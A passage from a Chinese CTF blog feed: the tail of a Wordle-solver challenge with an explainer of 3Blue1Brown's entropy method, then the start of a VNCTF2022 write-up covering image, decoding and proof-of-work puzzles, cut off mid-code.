class="string">&#x27;peons&#x27;</span>, <span class="string">&#x27;waxes&#x27;</span>, <span class="string">&#x27;roams&#x27;</span>, <span class="string">&#x27;sabes&#x27;</span>, <span class="string">&#x27;slats&#x27;</span>, <span class="string">&#x27;buoys&#x27;</span>, <span class="string">&#x27;reaps&#x27;</span>, <span class="string">&#x27;ruses&#x27;</span>, <span class="string">&#x27;oases&#x27;</span>, <span class="string">&#x27;plugs&#x27;</span>, <span class="string">&#x27;ticks&#x27;</span>, <span class="string">&#x27;dames&#x27;</span>, <span class="string">&#x27;warts&#x27;</span>, <span class="string">&#x27;miens&#x27;</span>, <span class="string">&#x27;reeks&#x27;</span>, <span class="string">&#x27;motes&#x27;</span>, <span class="string">&#x27;sixes&#x27;</span>, <span class="string">&#x27;clays&#x27;</span>, <span class="string">&#x27;teems&#x27;</span>, <span class="string">&#x27;casus&#x27;</span>, <span class="string">&#x27;cores&#x27;</span>, <span class="string">&#x27;runes&#x27;</span>, <span class="string">&#x27;lutes&#x27;</span>, <span class="string">&#x27;meres&#x27;</span>, <span class="string">&#x27;quips&#x27;</span>, <span class="string">&#x27;blocs&#x27;</span>, <span class="string">&#x27;preys&#x27;</span>, <span class="string">&#x27;slops&#x27;</span>, <span class="string">&#x27;quais&#x27;</span>, <span class="string">&#x27;altos&#x27;</span>, <span class="string">&#x27;leeks&#x27;</span>, <span class="string">&#x27;dooms&#x27;</span>, <span class="string">&#x27;hires&#x27;</span>, <span class="string">&#x27;solus&#x27;</span>, <span class="string">&#x27;fifes&#x27;</span>, <span class="string">&#x27;gules&#x27;</span>, <span class="string">&#x27;maces&#x27;</span>, <span class="string">&#x27;thews&#x27;</span>, <span class="string">&#x27;sagas&#x27;</span>, <span class="string">&#x27;scans&#x27;</span>, <span class="string">&#x27;devas&#x27;</span>, <span class="string">&#x27;ovals&#x27;</span>, <span class="string">&#x27;pures&#x27;</span>, <span class="string">&#x27;lairs&#x27;</span>, <span class="string">&#x27;gnaws&#x27;</span>, <span class="string">&#x27;peres&#x27;</span>, <span class="string">&#x27;snags&#x27;</span>, <span class="string">&#x27;keels&#x27;</span>, <span class="string">&#x27;grays&#x27;</span>, <span class="string">&#x27;slags&#x27;</span>, <span class="string">&#x27;pelts&#x27;</span>, <span class="string">&#x27;plows&#x27;</span>, <span class="string">&#x27;grabs&#x27;</span>, <span class="string">&#x27;helms&#x27;</span>, <span class="string">&#x27;gouts&#x27;</span>, <span class="string">&#x27;bides&#x27;</span>, <span class="string">&#x27;jacks&#x27;</span>, <span class="string">&#x27;piles&#x27;</span>, <span class="string">&#x27;almas&#x27;</span>, <span class="string">&#x27;barbs&#x27;</span>, <span class="string">&#x27;brigs&#x27;</span>, <span class="string">&#x27;nears&#x27;</span>, <span class="string">&#x27;flues&#x27;</span>, <span class="string">&#x27;wafts&#x27;</span>, <span class="string">&#x27;pecks&#x27;</span>, <span class="string">&#x27;avows&#x27;</span>, <span class="string">&#x27;trams&#x27;</span>, <span class="string">&#x27;varas&#x27;</span>, <span class="string">&#x27;hinds&#x27;</span>, <span class="string">&#x27;laths&#x27;</span>, <span class="string">&#x27;welks&#x27;</span>, <span class="string">&#x27;snobs&#x27;</span>, <span class="string">&#x27;dotes&#x27;</span>, <span class="string">&#x27;taels&#x27;</span>, <span class="string">&#x27;mends&#x27;</span>, <span class="string">&#x27;fives&#x27;</span>, <span class="string">&#x27;rungs&#x27;</span>, <span class="string">&#x27;rimes&#x27;</span>, <span class="string">&#x27;aegis&#x27;</span>, <span class="string">&#x27;routs&#x27;</span>, <span class="string">&#x27;gages&#x27;</span>, <span class="string">&#x27;pates&#x27;</span>, <span class="string">&#x27;ducts&#x27;</span>, <span class="string">&#x27;ricks&#x27;</span>, <span class="string">&#x27;diets&#x27;</span>, <span class="string">&#x27;lavas&#x27;</span>, <span class="string">&#x27;boles&#x27;</span>, <span class="string">&#x27;mesas&#x27;</span>, <span class="string">&#x27;locis&#x27;</span>, <span class="string">&#x27;aeons&#x27;</span>, <span class="string">&#x27;reams&#x27;</span>, <span class="string">&#x27;fanes&#x27;</span>, <span class="string">&#x27;fauns&#x27;</span>, <span class="string">&#x27;tapes&#x27;</span>, <span class="string">&#x27;bangs&#x27;</span>, <span class="string">&#x27;bodes&#x27;</span>, <span class="string">&#x27;drips&#x27;</span>, <span class="string">&#x27;wicks&#x27;</span>, <span class="string">&#x27;polis&#x27;</span>, <span class="string">&#x27;dures&#x27;</span>, <span class="string">&#x27;foams&#x27;</span>, <span class="string">&#x27;loges&#x27;</span>, <span class="string">&#x27;seres&#x27;</span>, <span class="string">&#x27;harts&#x27;</span>, <span class="string">&#x27;clous&#x27;</span>, <span class="string">&#x27;whigs&#x27;</span>, <span class="string">&#x27;brags&#x27;</span>, <span class="string">&#x27;cribs&#x27;</span>, <span class="string">&#x27;yelps&#x27;</span>, <span class="string">&#x27;sulks&#x27;</span>, <span class="string">&#x27;etats&#x27;</span>, <span class="string">&#x27;dimes&#x27;</span>, <span class="string">&#x27;tilts&#x27;</span>, <span class="string">&#x27;moats&#x27;</span>, <span class="string">&#x27;sills&#x27;</span>, <span class="string">&#x27;pedis&#x27;</span>, <span class="string">&#x27;pokes&#x27;</span>, <span class="string">&#x27;ruffs&#x27;</span>, <span class="string">&#x27;braes&#x27;</span>, <span class="string">&#x27;mumps&#x27;</span>, <span class="string">&#x27;dices&#x27;</span>, <span class="string">&#x27;greys&#x27;</span>, <span class="string">&#x27;duros&#x27;</span>, <span class="string">&#x27;wanes&#x27;</span>, <span class="string">&#x27;humps&#x27;</span>, <span class="string">&#x27;hilts&#x27;</span>, <span class="string">&#x27;sinds&#x27;</span>, <span class="string">&#x27;deans&#x27;</span>, <span class="string">&#x27;hauls&#x27;</span>, <span class="string">&#x27;mints&#x27;</span>, <span class="string">&#x27;naves&#x27;</span>, <span class="string">&#x27;leges&#x27;</span>, <span class="string">&#x27;mimes&#x27;</span>, <span class="string">&#x27;opals&#x27;</span>, <span class="string">&#x27;jeans&#x27;</span>, <span class="string">&#x27;daubs&#x27;</span>, <span class="string">&#x27;gears&#x27;</span>, <span class="string">&#x27;hoots&#x27;</span>, <span class="string">&#x27;loons&#x27;</span>, <span class="string">&#x27;rides&#x27;</span>, <span class="string">&#x27;annas&#x27;</span>, <span class="string">&#x27;burrs&#x27;</span>, <span class="string">&#x27;clips&#x27;</span>, <span class="string">&#x27;vanes&#x27;</span>, <span class="string">&#x27;goads&#x27;</span>, <span class="string">&#x27;skims&#x27;</span>, <span class="string">&#x27;brims&#x27;</span>, <span class="string">&#x27;bulks&#x27;</span>, <span class="string">&#x27;oozes&#x27;</span>, <span class="string">&#x27;tiges&#x27;</span>, <span class="string">&#x27;volts&#x27;</span>, <span class="string">&#x27;pelas&#x27;</span>, <span class="string">&#x27;papas&#x27;</span>, <span class="string">&#x27;gapes&#x27;</span>, <span class="string">&#x27;autos&#x27;</span>, <span class="string">&#x27;eases&#x27;</span>, <span class="string">&#x27;girds&#x27;</span>, <span class="string">&#x27;pries&#x27;</span>, <span class="string">&#x27;vires&#x27;</span>, <span class="string">&#x27;plebs&#x27;</span>, <span class="string">&#x27;clews&#x27;</span>, <span class="string">&#x27;leves&#x27;</span>, <span class="string">&#x27;gaols&#x27;</span>, <span class="string">&#x27;minas&#x27;</span>, <span class="string">&#x27;whens&#x27;</span>, <span class="string">&#x27;malis&#x27;</span>]</span><br><span class="line">sagas</span><br><span class="line">b<span class="string">&#x27;Wrong!   \x1b[47m  \x1b[0m \x1b[42m  \x1b[0m \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m\n&gt; &#x27;</span></span><br><span class="line">白色 <span class="number">3527</span></span><br><span class="line">绿色 <span class="number">638</span></span><br><span class="line">白色 <span class="number">617</span></span><br><span class="line">白色 <span class="number">593</span></span><br><span class="line">白色 <span class="number">405</span></span><br><span class="line"><span class="symbol">Q</span> [(<span class="string">&#x27;c1&#x27;</span>, <span class="number">43</span>), (<span class="string">&#x27;r3&#x27;</span>, <span class="number">53</span>), (<span class="string">&#x27;y5&#x27;</span>, <span class="number">80</span>), (<span class="string">&#x27;e4&#x27;</span>, <span class="number">104</span>)]</span><br><span class="line">[<span class="string">&#x27;paper&#x27;</span>, <span class="string">&#x27;panel&#x27;</span>, <span class="string">&#x27;lapel&#x27;</span>, <span class="string">&#x27;cater&#x27;</span>, <span class="string">&#x27;gamer&#x27;</span>, <span class="string">&#x27;payer&#x27;</span>, <span class="string">&#x27;label&#x27;</span>, <span class="string">&#x27;parer&#x27;</span>, <span class="string">&#x27;baker&#x27;</span>, <span class="string">&#x27;valet&#x27;</span>, <span class="string">&#x27;laden&#x27;</span>, <span class="string">&#x27;tamer&#x27;</span>, <span class="string">&#x27;hater&#x27;</span>, <span class="string">&#x27;eater&#x27;</span>, <span class="string">&#x27;paler&#x27;</span>, <span class="string">&#x27;eaten&#x27;</span>, <span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;matey&#x27;</span>, <span class="string">&#x27;later&#x27;</span>, <span class="string">&#x27;hazel&#x27;</span>, <span class="string">&#x27;haven&#x27;</span>, <span class="string">&#x27;gavel&#x27;</span>, <span class="string">&#x27;harem&#x27;</span>, <span class="string">&#x27;taper&#x27;</span>, <span class="string">&#x27;ramen&#x27;</span>, <span class="string">&#x27;caper&#x27;</span>, <span class="string">&#x27;oaken&#x27;</span>, <span class="string">&#x27;racer&#x27;</span>, <span class="string">&#x27;waxen&#x27;</span>, <span class="string">&#x27;easel&#x27;</span>, <span class="string">&#x27;gazer&#x27;</span>, <span class="string">&#x27;facet&#x27;</span>, <span class="string">&#x27;navel&#x27;</span>, <span class="string">&#x27;water&#x27;</span>, <span class="string">&#x27;cameo&#x27;</span>, <span class="string">&#x27;maker&#x27;</span>, <span class="string">&#x27;taken&#x27;</span>, <span class="string">&#x27;camel&#x27;</span>, <span class="string">&#x27;cadet&#x27;</span>, <span class="string">&#x27;rarer&#x27;</span>, <span class="string">&#x27;waver&#x27;</span>, <span class="string">&#x27;baler&#x27;</span>, <span class="string">&#x27;wafer&#x27;</span>, <span class="string">&#x27;gayer&#x27;</span>, <span class="string">&#x27;taker&#x27;</span>, <span class="string">&#x27;payee&#x27;</span>, <span class="string">&#x27;raven&#x27;</span>, <span class="string">&#x27;named&#x27;</span>, <span class="string">&#x27;based&#x27;</span>, <span class="string">&#x27;dared&#x27;</span>, <span class="string">&#x27;gazed&#x27;</span>, <span class="string">&#x27;cared&#x27;</span>, <span class="string">&#x27;hated&#x27;</span>, <span class="string">&#x27;naked&#x27;</span>, <span class="string">&#x27;faced&#x27;</span>, <span class="string">&#x27;faded&#x27;</span>, <span class="string">&#x27;waved&#x27;</span>, <span class="string">&#x27;dated&#x27;</span>, <span class="string">&#x27;paved&#x27;</span>, <span class="string">&#x27;fared&#x27;</span>, <span class="string">&#x27;dazed&#x27;</span>, <span class="string">&#x27;waked&#x27;</span>, <span class="string">&#x27;waxed&#x27;</span>, <span class="string">&#x27;taxed&#x27;</span>, <span class="string">&#x27;raced&#x27;</span>, <span class="string">&#x27;laten&#x27;</span>, <span class="string">&#x27;famed&#x27;</span>, <span class="string">&#x27;bared&#x27;</span>, <span class="string">&#x27;fated&#x27;</span>, <span class="string">&#x27;waken&#x27;</span>, <span class="string">&#x27;laced&#x27;</span>, <span class="string">&#x27;waded&#x27;</span>, <span class="string">&#x27;tamed&#x27;</span>, <span class="string">&#x27;eased&#x27;</span>, <span class="string">&#x27;jaded&#x27;</span>, <span class="string">&#x27;rated&#x27;</span>, <span class="string">&#x27;paled&#x27;</span>, <span class="string">&#x27;raked&#x27;</span>, <span class="string">&#x27;fader&#x27;</span>, <span class="string">&#x27;baser&#x27;</span>, <span class="string">&#x27;raved&#x27;</span>, <span class="string">&#x27;waned&#x27;</span>, <span class="string">&#x27;gaped&#x27;</span>, <span class="string">&#x27;mater&#x27;</span>, <span class="string">&#x27;pater&#x27;</span>, <span class="string">&#x27;pared&#x27;</span>, <span class="string">&#x27;cased&#x27;</span>, <span class="string">&#x27;bated&#x27;</span>, <span class="string">&#x27;razed&#x27;</span>, <span class="string">&#x27;mated&#x27;</span>, <span class="string">&#x27;laver&#x27;</span>, <span class="string">&#x27;haled&#x27;</span>, <span class="string">&#x27;babel&#x27;</span>, <span class="string">&#x27;pawed&#x27;</span>, <span class="string">&#x27;lamed&#x27;</span>, <span class="string">&#x27;caked&#x27;</span>, <span class="string">&#x27;baked&#x27;</span>, <span class="string">&#x27;payed&#x27;</span>, <span class="string">&#x27;lader&#x27;</span>, <span class="string">&#x27;caved&#x27;</span>, <span class="string">&#x27;laved&#x27;</span>, <span class="string">&#x27;haver&#x27;</span>, <span class="string">&#x27;paseo&#x27;</span>, <span class="string">&#x27;oaten&#x27;</span>]</span><br><span class="line">b<span class="string">&#x27;Wrong!   \x1b[47m  \x1b[0m \x1b[42m  \x1b[0m \x1b[43m  \x1b[0m \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m\n&gt; &#x27;</span></span><br><span class="line">白色 <span class="number">362</span></span><br><span class="line">绿色 <span class="number">362</span></span><br><span class="line">黄色 <span class="number">78</span></span><br><span class="line">白色 <span class="number">69</span></span><br><span class="line">白色 <span class="number">53</span></span><br><span class="line"><span class="symbol">Q</span> [(<span class="string">&#x27;s3&#x27;</span>, <span class="number">10</span>), (<span class="string">&#x27;t1&#x27;</span>, <span class="number">15</span>), (<span class="string">&#x27;t5&#x27;</span>, <span class="number">22</span>), (<span class="string">&#x27;t4&#x27;</span>, <span class="number">23</span>)]</span><br><span class="line">[<span class="string">&#x27;waste&#x27;</span>, <span class="string">&#x27;waltz&#x27;</span>, <span class="string">&#x27;paste&#x27;</span>, <span class="string">&#x27;earth&#x27;</span>, <span class="string">&#x27;caste&#x27;</span>, <span class="string">&#x27;haste&#x27;</span>, <span class="string">&#x27;cacti&#x27;</span>, <span class="string">&#x27;taste&#x27;</span>, <span class="string">&#x27;pasta&#x27;</span>, <span class="string">&#x27;baste&#x27;</span>, <span class="string">&#x27;haute&#x27;</span>, <span class="string">&#x27;faith&#x27;</span>, <span class="string">&#x27;parti&#x27;</span>, <span class="string">&#x27;hasta&#x27;</span>, <span class="string">&#x27;tanto&#x27;</span>, <span class="string">&#x27;carte&#x27;</span>, <span class="string">&#x27;canto&#x27;</span>, <span class="string">&#x27;carta&#x27;</span>, <span class="string">&#x27;baith&#x27;</span>, <span class="string">&#x27;basta&#x27;</span>, <span class="string">&#x27;facta&#x27;</span>, <span class="string">&#x27;garth&#x27;</span>, <span class="string">&#x27;tanti&#x27;</span>]</span><br><span class="line">b<span class="string">&#x27;Wrong!   \x1b[43m  \x1b[0m \x1b[42m  \x1b[0m \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m\n&gt; &#x27;</span></span><br><span class="line">黄色 <span class="number">38</span></span><br><span class="line">绿色 <span class="number">38</span></span><br><span class="line">白色 <span class="number">30</span></span><br><span class="line">白色 <span class="number">18</span></span><br><span class="line">白色 <span class="number">18</span></span><br><span class="line"><span class="symbol">Q</span> [(<span class="string">&#x27;h1&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;u3&#x27;</span>, <span class="number">7</span>), (<span class="string">&#x27;n4&#x27;</span>, <span class="number">8</span>)]</span><br><span class="line">[<span class="string">&#x27;jaunt&#x27;</span>, <span class="string">&#x27;gaunt&#x27;</span>, <span class="string">&#x27;faint&#x27;</span>, <span class="string">&#x27;haunt&#x27;</span>, <span class="string">&#x27;paint&#x27;</span>, <span class="string">&#x27;daunt&#x27;</span>, <span class="string">&#x27;vaunt&#x27;</span>, <span class="string">&#x27;haint&#x27;</span>]</span><br><span class="line">b<span class="string">&#x27;Wrong!   \x1b[47m  \x1b[0m \x1b[42m  \x1b[0m \x1b[47m  \x1b[0m \x1b[42m  \x1b[0m \x1b[42m  \x1b[0m\n&gt; &#x27;</span></span><br><span class="line">白色 <span class="number">14</span></span><br><span class="line">绿色 <span class="number">14</span></span><br><span class="line">白色 <span class="number">8</span></span><br><span class="line">绿色 <span class="number">2</span></span><br><span class="line">绿色 <span class="number">2</span></span><br><span class="line"><span class="symbol">Q</span> [(<span class="string">&#x27;p1&#x27;</span>, <span class="number">1</span>)]</span><br><span class="line">[<span class="string">&#x27;paint&#x27;</span>]</span><br><span class="line">b<span class="string">&#x27;Correct! \x1b[42m  \x1b[0m \x1b[42m  \x1b[0m \x1b[42m  \x1b[0m \x1b[42m  \x1b[0m \x1b[42m  \x1b[0m\nRound 3: #e896c\n&gt; &#x27;</span></span><br></pre></td></tr></table></figure><p>平均所需次数仍然 <strong>&gt;6</strong>,虽然得到了模式1的第一位奖励 :    (</p><p>一度怀疑计算机没色弱好使🤔</p><p><code>Here is you award: U**********************************************************</code></p><p>不过呢，从开始写的第一个Python交互版的代码开始，其实就已经<strong>可以解决模式0</strong>了</p><p><code>Here is you award: NULL</code></p><p><strong>给我干沉默了…</strong></p><h2 id="最后的想法"><a href="#最后的想法" class="headerlink" title="最后的想法"></a>最后的想法</h2><p>看到了一篇介绍 3Blue1Brown 关于给出Wordle理论极限解的文章，受到了启发，但时间不够了。</p><h3 id="3Blue1Brown"><a href="#3Blue1Brown" class="headerlink" title="3Blue1Brown"></a><a href="https://www.youtube.com/c/3blue1brown">3Blue1Brown</a></h3><blockquote><p>3Blue1Brown，这是一个由斯坦福大学的数学系学生<strong>Grant Sanderson</strong> 创建的<strong>YouTube</strong> 频道。该频道从独特的视觉角度解说<strong>高等数学</strong>，内容包括<strong>线性代数</strong>、<strong>微积分</strong>、<strong>神经网络</strong>、<strong>黎曼猜想</strong>、<strong>傅里叶变换</strong>以及<strong>四元数</strong>等等。</p><p>据说名字<strong>由来</strong>是因为其眼瞳的颜色为三分蓝一分棕</p></blockquote><p><a href="https://image.baidu.com/search/detail?ct=503316480&z=undefined&tn=baiduimagedetail&ipn=d&word=3Blue1Brown&step_word=&ie=utf-8&in=&cl=2&lm=-1&st=undefined&hd=undefined&latest=undefined&copyright=undefined&cs=3682092774,1382242696&os=2454846047,1012666865&simid=3458819606,367731354&pn=0&rn=1&di=53350&ln=579&fr=&fmq=1645475386153_R&fm=&ic=undefined&s=undefined&se=&sme=&tab=0&width=undefined&height=undefined&face=undefined&is=0,0&istype=0&ist=&jit=&bdtype=0&spn=0&pi=0&gsm=0&objurl=https%3A%2F%2Fgimg2.baidu.com%2Fimage_search%2Fsrc%3Dhttp%3A%2F%2Fpic1.zhimg.com%2Fv2-4a8340dfed0ac1ed8de1c5546b3d3ce8_1200x500.jpg%26refer%3Dhttp%3A%2F%2Fpic1.zhimg.com%26app%3D2002%26size%3Df9999%2C10000%26q%3Da80%26n%3D0%26g%3D0n%26fmt%3Djpeg%3Fsec%3D1648067385%26t%3Dc3734841a4fb66a4c6c294c97ef0f5b6&rpstart=0&rpnum=0&adpicid=0&nojc=undefined&dyTabStr=MCwyLDQsMyw2LDEsNSw4LDcsOQ%3D%3D"><img src="https://img2.baidu.com/it/u=536081512,3776059271&fm=253&fmt=auto&app=138&f=JPEG?w=790&h=438" alt="3Blue1Brown"></a></p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><blockquote><p><strong>从每一次猜测中获得最多信息</strong></p><p>Wordle 的游戏规则很简单，玩家需要猜出程序每天指定的一个 5 位英语单词谜底。玩家可以随意提交一个英语单词，但必须是字典里有的，不能胡乱拼写。如果字母在谜底中出现且位置对了就显示绿色，字母出现了但位置不对就显示黄色，字母在答案的单词中没出现就显示灰色。根据反馈信息再进行下一轮猜测，在 6 次尝试之内猜出就算赢。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/7EEBDD69D1A80A58B0B98A1DD8A15214A71D93AE_size79_w374_h552.png" alt="img"></p><p><strong>如何让步数尽量少？</strong></p><p>3Blue1Brown 的总体思路是尽量从每一次猜测中获得最多的信息。他先是找来了 26 个字母在英语文本中出现频率的统计数据，尝试在前两次尝试中覆盖最多高频字母。比如 other+nails 的组合，就可以覆盖出现频率最高的 11 个字母中的 10 个，如果运气好就能确定下来一些字母。即使这些字母都没出现依然是一种信息量很大的反馈，10 个常用字母都没出现的单词数量就大大减少了，让下一步猜测更简单。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/E29F09BB47699384747BF4E488217E0621504BAA_size93_w1080_h584.png" alt="img"></p><p>不过在尝试过程中，又出现了新的问题。同样用 nails 这几个字母，也可以拼成 snail ，这两种拼写顺序之间的差异，仅依据字母频率数据是无法衡量的。</p><p>下面需要一种新的计算方法。</p><p><strong>如何计算信息量？</strong></p><p>原版 Wordle 游戏里有一个数量 12972 的总单词列表，都能作为猜测词使用。另外有一个 2315 个单词的列表，只有这些单词会出现在答案里 (据说是游戏作者的女朋友挑选的)。因为游戏是用 Javascript 写的，数据都在客户端，这些数据直接可以从源码里找到。不过 3Blue1Brown 觉得让程序利用答案列表的话有点像作弊了，他果断给自己加大难度，只考虑总单词列表。游戏中，每一次猜测都能从 12972 个单词中排除一些结果。比如猜测 weary，如果 W 位置正确同时 A 出现了，那么剩下的可选单词只剩 58 个。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/A61E55F850D1AEF648D64AF2431DE70E2E9CBD34_size112_w1080_h564.png" alt="img"></p><p>这样对同一个猜测，从 5 个字母全没出现到 5 个字母全对的各种反馈的概率都可以计算出来。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/81FD975E25F46C2387DFEFE5D02F7947A568A99A_size725_w900_h506.gif" alt="img"></p><p>这样，问题就变成了如何评估各种反馈情况包含的信息量。</p><p>3Blue1Brown 选择的办法，就是利用信息论祖师爷香农提出的信息熵概念。信息熵描述的是事件的不确定性，单位就是大家知道的比特。理解起来也不难，可以用扔硬币来解释。</p><p>扔 1 枚硬币只会出现正、反两种结果，而且概率相等。扔 2 枚硬币就有正正、正反、反正、反反这 4 种结果，扔 3 枚有 8 种情况等等，也就是扔 n 次有 2 的 n 次方种结果。</p><p>当一个事件有两种结果且概率都是 1/2，其不确定性相当于扔 1 枚硬币，此时信息熵定义为 1 比特。如果一个事件有 8 种结果且概率都是 1/8，就相当于扔 3 枚硬币，此时信息熵就是 3 比特。</p><p>信息量和信息熵的数量相等、意义相反，相当于衡量一则信息能消除多少不确定性。设每种结果的概率为 p，信息量为 I，有如下等式。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/40B5E52187C453F214A8AD7CB76F4C81657F71D8_size13_w318_h218.png" alt="img"></p><p>稍作变换，可以得到信息量的计算公式。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/845F8631EE236990700ACC3F0611ED9753280919_size85_w382_h668.png" alt="img"></p><p>回到 Wordle 游戏上，一次猜测获得的信息量可以用每种可能情况的概率与对应信息量相乘、再把结果相加来计算，也就是求数学期望。</p><p>以猜测 weary 为例，计算出获得的信息量为 4.9 比特。代表这则信息消除的不确定性比扔 5 个硬币的不确定性少一点。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/F65FDF928D19A2A59075F82E77886D3DEFED650C_size19_w536_h94.png" alt="img"></p><p>算法思路有了，接下来就可以交给程序，计算出所有 12972 个单词的能消除的信息熵。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/4A7C8A2B7FD58A3DCE7B2ACA2E1C21EB9B0AF730_size1171_w900_h506.gif" alt="img"></p><p>用同样的方法，可以再计算第二步、第三步猜测能消除的信息熵。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/190DDAB0CD90A81690C2EDDF4E56D588136E89E9_size565_w900_h506.gif" alt="img"></p><p>根据这些计算结果，程序就可以在每一次猜测时，选择所有可能单词里能消除信息熵最多的那个。</p><p>比如第一次猜 slate 获得一次反馈，此时还剩下 578 个单词可选，其中选 ramin 能消除最多的信息熵，这样一步一步猜直到猜出正确答案。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/328D484D4420539BB9A47ACD243F946ED8853D55_size160_w1080_h606.png" alt="img"></p><p>接下来，拿这个程序在所有 2135 种可能的答案上跑一遍，平均用了 4.124 步猜出正确答案。</p><p><img src="https://x0.ifengimg.com/ucms/2022_07/E41781ACC9E01B37C1B310D0366B9DC7AC42E9E6_size142_w1080_h752.png" alt="img"></p><p>3Blue1Brown 觉得这个成绩还不够好，至少没有超过普通人类玩家水平，还需要继续优化。</p></blockquote><p>那么借用信息墒概念，通过代码实现就完全够用了（<strong>平均用了 4.124 步</strong>，大不了多试几次</p><p>插一句，3Blue1Brown最后通过对单词进行词频分析以选择常用词使其算法最终成绩到达 3.138，逼近了理论极限。</p><p>可惜，现在靶机关闭了，无法实际编写代码</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://tech.ifeng.com/c/8DUbq3AbUQ5">https://tech.ifeng.com/c/8DUbq3AbUQ5</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2022公开赛WP</title>
      <link href="/2022/02/12/VNCTF2022%E5%85%AC%E5%BC%80%E8%B5%9BWP/"/>
      <url>/2022/02/12/VNCTF2022%E5%85%AC%E5%BC%80%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="VNCTF2022公开赛-Writeup"><a href="#VNCTF2022公开赛-Writeup" class="headerlink" title="VNCTF2022公开赛 Writeup"></a>VNCTF2022公开赛 Writeup</h1><h2 id="1-个人信息"><a href="#1-个人信息" class="headerlink" title="1. 个人信息"></a>1. 个人信息</h2><p>名称：0HB</p><p>排名：73</p><h2 id="2-解题情况"><a href="#2-解题情况" class="headerlink" title="2. 解题情况"></a>2. 解题情况</h2><p>一道Crypto，总五道</p><p>一道Web， 总五道</p><p>两道Misc，总六道</p><p>其中Crypto方向第27名</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220212214134403.png" alt="答题情况"></p><h2 id="3-具体WP"><a href="#3-具体WP" class="headerlink" title="3. 具体WP"></a>3. 具体WP</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h3><h4 id="题目一名称：仔细找找"><a href="#题目一名称：仔细找找" class="headerlink" title="题目一名称：仔细找找"></a>题目一名称：仔细找找</h4><h5 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h5><p>原图肉眼可得：VN???{34a?@w}</p><p>盲猜vnctf{…}</p><h5 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h5><p>改了下颜色，对着<strong>a之后</strong>、<strong>@之前</strong>看点是否连成线来确定“被遮挡住”的形状为E</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220212214227548.png" alt="绿色"></p><blockquote><p>vnctf{34aE@w}</p></blockquote><h4 id="题目二名称：问卷"><a href="#题目二名称：问卷" class="headerlink" title="题目二名称：问卷"></a>题目二名称：问卷</h4><p><strong>步骤一</strong></p><p>填完问卷即解。</p><hr><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="题目一名称：GameV4-0"><a href="#题目一名称：GameV4-0" class="headerlink" title="题目一名称：GameV4.0"></a>题目一名称：GameV4.0</h4><p><strong>步骤一</strong></p><p>启动靶机，转到页面，审查元素</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220212214329109.png" alt="web"></p><p><strong>步骤二</strong></p><ul><li>Base64解码</li><li>Url解码</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220212214423048.png" alt="CyberChef解码"></p><hr><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="题目一名称：ezmath"><a href="#题目一名称：ezmath" class="headerlink" title="题目一名称：ezmath"></a>题目一名称：ezmath</h4><p><strong>步骤一</strong></p><p>启动靶机，下载server.py文件，连接(macOS)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> node<span class="number">4</span>.buuoj.cn <span class="number">25196</span></span><br></pre></td></tr></table></figure><p><strong>步骤二</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[+]</span> sha256(XXXX+k7h8CNcM3jCpuivQ) == <span class="number">7</span>dbe1e6a592f589a44508d3cb5d72e87a2f653714109dd16d1d94ea461c59a9c</span><br><span class="line"><span class="string">[+]</span> Plz Tell Me XXXX :</span><br></pre></td></tr></table></figure><p>连接后，可见<strong>四位的sha256爆破</strong></p><p>上Python,写！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decry</span>(<span class="params">data</span>):</span></span><br><span class="line">    s = hashlib.sha256()  <span class="comment"># Get the hash algorithm.</span></span><br><span class="line">    